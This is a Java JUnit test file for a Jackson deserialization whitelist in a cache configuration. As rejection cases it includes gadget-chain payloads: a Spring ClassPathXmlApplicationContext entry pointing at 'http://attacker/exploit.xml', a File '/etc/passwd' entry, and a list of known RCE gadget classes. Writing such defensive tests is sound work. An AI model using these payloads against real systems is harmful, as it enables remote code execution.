package com.personal.marketnote.common.configuration.cache;

import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * CachePolymorphicTypeValidatorFactory 단위 테스트.
 * <p>
 * 보안 정책(#4856) 개입화: 5개 prefix 화이트리스트(com.personal.marketnote., java.util., java.time., java.math., java.lang.)
 * 외 클래스 폴리모픽 역직렬화를 차단하는지 라운드트립으로 검증한다.
 */
class CachePolymorphicTypeValidatorFactoryTest {

    private ObjectMapper buildMapperWithFactory() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.activateDefaultTyping(
                CachePolymorphicTypeValidatorFactory.createDefault(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );
        // 도메인 fixture 라운드트립을 위한 visibility 설정 (CacheConfigObjectMapperTest 패턴 정합).
        // 가젯 거부 케이스는 mapper visibility 상태와 무관하게 InvalidTypeIdException이 발생해야 한다.
        mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.SETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.FIELD, JsonAutoDetect.Visibility.ANY);
        return mapper;
    }

    @Test
    @DisplayName("createDefault는 com.personal.marketnote. prefix 클래스를 허용한다")
    void createDefault_shouldAllowPersonalMarketnotePrefix() throws Exception {
        // given
        BasicPolymorphicTypeValidator validator = CachePolymorphicTypeValidatorFactory.createDefault();
        ObjectMapper mapper = buildMapperWithFactory();
        // com.personal.marketnote. prefix는 java/util 외 라운드트립이 어렵지만,
        // validator 자체로 직접 검증한다.

        // when
        BasicPolymorphicTypeValidator.Validity validity = validator.validateSubClassName(
                mapper.getDeserializationConfig(),
                mapper.constructType(Object.class),
                "com.personal.marketnote.common.configuration.cache.CachePolymorphicTypeValidatorFactory"
        );

        // then
        assertThat(validity).isEqualTo(BasicPolymorphicTypeValidator.Validity.ALLOWED);
    }

    @Test
    @DisplayName("createDefault는 java.util. prefix 클래스를 허용한다")
    void createDefault_shouldAllowJavaUtilPrefix() throws JsonProcessingException {
        // given
        ObjectMapper mapper = buildMapperWithFactory();
        List<String> list = new ArrayList<>(List.of("a", "b"));

        // when
        String json = mapper.writeValueAsString(list);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        assertThat((List<?>) deserialized).isEqualTo(List.of("a", "b"));
    }

    @Test
    @DisplayName("createDefault는 java.time. prefix 클래스를 허용한다")
    void createDefault_shouldAllowJavaTimePrefix() throws Exception {
        // given
        BasicPolymorphicTypeValidator validator = CachePolymorphicTypeValidatorFactory.createDefault();
        ObjectMapper mapper = new ObjectMapper();

        // when
        BasicPolymorphicTypeValidator.Validity validity = validator.validateSubClassName(
                mapper.getDeserializationConfig(),
                mapper.constructType(Object.class),
                LocalDateTime.class.getName()
        );

        // then
        assertThat(validity).isEqualTo(BasicPolymorphicTypeValidator.Validity.ALLOWED);
    }

    @Test
    @DisplayName("createDefault는 java.math. prefix 클래스를 허용한다")
    void createDefault_shouldAllowJavaMathPrefix() throws Exception {
        // given
        BasicPolymorphicTypeValidator validator = CachePolymorphicTypeValidatorFactory.createDefault();
        ObjectMapper mapper = new ObjectMapper();

        // when
        BasicPolymorphicTypeValidator.Validity validity = validator.validateSubClassName(
                mapper.getDeserializationConfig(),
                mapper.constructType(Object.class),
                BigDecimal.class.getName()
        );

        // then
        assertThat(validity).isEqualTo(BasicPolymorphicTypeValidator.Validity.ALLOWED);
    }

    @Test
    @DisplayName("createDefault는 java.lang. prefix 클래스를 허용한다")
    void createDefault_shouldAllowJavaLangPrefix() throws Exception {
        // given
        BasicPolymorphicTypeValidator validator = CachePolymorphicTypeValidatorFactory.createDefault();
        ObjectMapper mapper = new ObjectMapper();

        // when
        BasicPolymorphicTypeValidator.Validity validity = validator.validateSubClassName(
                mapper.getDeserializationConfig(),
                mapper.constructType(Object.class),
                String.class.getName()
        );

        // then
        assertThat(validity).isEqualTo(BasicPolymorphicTypeValidator.Validity.ALLOWED);
    }

    @Test
    @DisplayName("createDefault는 화이트리스트에 없는 임의 패키지 클래스를 거부한다")
    void createDefault_shouldRejectUnwhitelistedPackage() {
        // given
        ObjectMapper mapper = buildMapperWithFactory();
        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("createDefault는 com.personal.marketnote. prefix 도메인 객체를 라운드트립으로 복원한다")
    void createDefault_shouldRoundTripPersonalMarketnoteDomainObject() throws JsonProcessingException {
        // given
        ObjectMapper mapper = buildMapperWithFactory();
        TestDomainFixture original = new TestDomainFixture("샘플", 100L);

        // when
        String json = mapper.writeValueAsString(original);
        Object deserialized = mapper.readValue(json, Object.class);

        // then - polymorphic type info로 도메인 타입 복원 + 필드 동등성
        assertThat(deserialized).isInstanceOf(TestDomainFixture.class);
        assertThat(deserialized).isEqualTo(original);
    }

    @Test
    @DisplayName("createDefault는 ArrayList에 담긴 com.personal.marketnote. 도메인 객체를 라운드트립으로 복원한다")
    void createDefault_shouldRoundTripPersonalMarketnoteDomainObjectInArrayList() throws JsonProcessingException {
        // given - #4886 회귀 패턴: 컬렉션 element 타입 복원 검증
        ObjectMapper mapper = buildMapperWithFactory();
        List<TestDomainFixture> original = new ArrayList<>(List.of(
                new TestDomainFixture("a", 1L),
                new TestDomainFixture("b", 2L)
        ));

        // when
        String json = mapper.writeValueAsString(original);
        Object deserialized = mapper.readValue(json, Object.class);

        // then - List 자체 + element가 도메인 타입으로 복원되어야 함
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> roundTripped = (List<?>) deserialized;
        assertThat(roundTripped).hasSize(2);
        assertThat(roundTripped.get(0)).isInstanceOf(TestDomainFixture.class);
        assertThat(roundTripped.get(1)).isInstanceOf(TestDomainFixture.class);
        assertThat(roundTripped).isEqualTo(original);
    }

    @Test
    @DisplayName("createDefault는 Spring gadget chain(ClassPathXmlApplicationContext) 역직렬화를 거부한다")
    void createDefault_shouldRejectSpringGadgetChain() {
        // given - 화이트리스트 외 패키지(org.springframework.) 거부 검증
        ObjectMapper mapper = buildMapperWithFactory();
        String maliciousJson = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://attacker/exploit.xml\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("createDefault는 javax.naming gadget(InitialContext) 역직렬화를 거부한다")
    void createDefault_shouldRejectJavaxNamingGadget() {
        // given - 화이트리스트 외 패키지(javax.naming.) 거부 검증
        ObjectMapper mapper = buildMapperWithFactory();
        String maliciousJson = "[\"javax.naming.InitialContext\",{}]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "org.apache.commons.collections.functors.InvokerTransformer",
            "javax.script.ScriptEngineManager",
            "com.sun.rowset.JdbcRowSetImpl",
            "com.sun.org.apache.bcel.internal.util.ClassLoader",
            "org.apache.xalan.xsltc.trax.TemplatesImpl",
            "com.fasterxml.jackson.databind.node.POJONode"
    })
    @DisplayName("createDefault는 알려진 RCE 가젯 카테고리 클래스 폴리모픽 역직렬화를 거부한다")
    void createDefault_shouldRejectKnownRceGadgetClasses(String className) {
        // given - 화이트리스트 prefix 미매칭 시 type id 단계에서 즉시 거부되는지 검증
        ObjectMapper mapper = buildMapperWithFactory();
        String maliciousJson = "[\"" + className + "\",{}]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("createDefault는 매 호출마다 동등한 정책을 반환한다")
    void createDefault_shouldReturnEquivalentPolicyOnEachCall() throws JsonProcessingException {
        // given
        ObjectMapper mapper1 = new ObjectMapper();
        mapper1.activateDefaultTyping(
                CachePolymorphicTypeValidatorFactory.createDefault(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );
        ObjectMapper mapper2 = new ObjectMapper();
        mapper2.activateDefaultTyping(
                CachePolymorphicTypeValidatorFactory.createDefault(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );

        // when - 둘 다 동일 입력에 대해 동일 결과 (allow / deny)
        List<String> allowed = new ArrayList<>(List.of("x"));
        String allowedJson1 = mapper1.writeValueAsString(allowed);
        String allowedJson2 = mapper2.writeValueAsString(allowed);

        Object roundTrip1 = mapper1.readValue(allowedJson1, Object.class);
        Object roundTrip2 = mapper2.readValue(allowedJson2, Object.class);

        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";

        // then
        assertThat(roundTrip1).isEqualTo(roundTrip2);
        assertThatThrownBy(() -> mapper1.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
        assertThatThrownBy(() -> mapper2.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    /**
     * 라운드트립 검증용 도메인 fixture.
     * <p>
     * 패키지가 {@code com.personal.marketnote.common.configuration.cache}이므로
     * 자동으로 {@code com.personal.marketnote.} 화이트리스트 prefix에 매칭된다.
     * <p>
     * NON_FINAL 정책에서 polymorphic type info가 부여되도록 일반 class로 정의(final/record 금지).
     * Jackson 인스턴스화를 위해 default constructor + 명시 생성자 + equals/hashCode를 모두 제공한다.
     * common 모듈은 서비스 도메인 의존이 없으므로 same-file static class로 개입화한다.
     */
    static class TestDomainFixture {

        private String name;
        private Long value;

        public TestDomainFixture() {
        }

        public TestDomainFixture(String name, Long value) {
            this.name = name;
            this.value = value;
        }

        @Override
        public boolean equals(Object o) {
            if (this == o) {
                return true;
            }
            if (!(o instanceof TestDomainFixture other)) {
                return false;
            }
            return Objects.equals(name, other.name) && Objects.equals(value, other.value);
        }

        @Override
        public int hashCode() {
            return Objects.hash(name, value);
        }
    }
}
